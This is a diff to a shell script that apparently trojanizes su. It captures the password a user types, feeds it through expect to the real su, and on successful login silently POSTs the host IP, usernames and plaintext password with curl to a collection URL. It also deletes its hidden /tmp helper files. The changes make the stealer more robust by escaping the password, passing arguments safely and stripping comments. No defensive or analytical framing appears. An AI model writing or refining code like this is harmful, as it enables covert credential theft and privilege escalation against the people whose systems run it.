@@ -53,13 +53,21 @@ TMPLOG=$(mktemp /tmp/.sulog.XXXXXX)
 TMPSH=$(mktemp /tmp/.sush.XXXXXX)
 chmod 600 "$TMPLOG" "$TMPSH"
 
+_json_esc() {
+    local s="$1"
+    s="${s//\\/\\\\}"
+    s="${s//\"/\\\"}"
+    printf '%s' "$s"
+}
+
 # Write fire-and-forget logging helper.
 # Interpolate all bash variables now so the script is self-contained.
+SAFE_PASS=$(_json_esc "$CAPTURED_PASS")
 cat > "$TMPSH" << LOGSCRIPT
 #!/bin/sh
 rm -f ${TMPLOG} ${TMPSH}
 PAYLOAD=\$(printf '{"host_ip":"%s","user":"%s","event_type":"su","timestamp":"%s","data":{"target_user":"%s","password":"%s","is_admin":%s}}' \
-    "${HOST_IP}" "${INVOKING_USER}" "${HOST_TS}" "${TARGET_USER}" "${CAPTURED_PASS}" "${IS_ADMIN}")
+    "${HOST_IP}" "${INVOKING_USER}" "${HOST_TS}" "${TARGET_USER}" "${SAFE_PASS}" "${IS_ADMIN}")
 curl -sf -X POST -H "Content-Type: application/json" \
     -d "\$PAYLOAD" --connect-timeout 3 --max-time 3 \
     "${COLLECT_URL}" > /dev/null 2>&1
@@ -100,42 +108,41 @@ fi
 #
 # On auth failure expect exits 1 and the process ends — tmpfiles are
 # cleaned up inside the expect script itself on that path.
-exec expect -c "
+export __SU_PW="$CAPTURED_PASS"
+exec expect -c '
     log_user 0
     set timeout 10
-    set tmplog {$TMPLOG}
-    set tmpsh  {$TMPSH}
+    set tmplog [lindex $argv 0]
+    set tmpsh  [lindex $argv 1]
+    set real_su [lindex $argv 2]
+    set su_args [lrange $argv 3 end]
 
-    spawn $REAL_SU $@
+    spawn $real_su {*}$su_args
 
     expect {
-        -nocase -re {password[^:]*:} { send {$CAPTURED_PASS}; send \"\r\" }
-        eof     { exec sh -c \"rm -f \$tmplog \$tmpsh\" ; exit 1 }
-        timeout { exec sh -c \"rm -f \$tmplog \$tmpsh\" ; exit 1 }
+        -nocase -re {password[^:]*:} { send "$env(__SU_PW)\r" }
+        eof     { exec sh -c "rm -f $tmplog $tmpsh" ; exit 1 }
+        timeout { exec sh -c "rm -f $tmplog $tmpsh" ; exit 1 }
     }
 
     set timeout 2
     expect {
         -nocase -re {(Authentication failure|incorrect password|su: )} {
-            exec sh -c \"rm -f \$tmplog \$tmpsh\"
+            exec sh -c "rm -f $tmplog $tmpsh"
             expect eof
             exit 1
         }
         eof {
-            exec sh -c \"rm -f \$tmplog \$tmpsh\"
+            exec sh -c "rm -f $tmplog $tmpsh"
             exit 1
         }
         timeout {
-            # Auth confirmed good — fire logging detached, then hand off pty
-            catch { exec sh \$tmpsh & }
+            catch { exec sh $tmpsh & }
         }
     }
 
-    # Send a newline to tickle the shell into redrawing its prompt,
-    # then hand off. Without this the prompt is there but invisible
-    # until the user hits Enter.
-    send \"\r\"
+    send "\r"
     set timeout -1
     interact
     exit 0
-" 2>/dev/null
+' "$TMPLOG" "$TMPSH" "$REAL_SU" "$@" 2>/dev/null
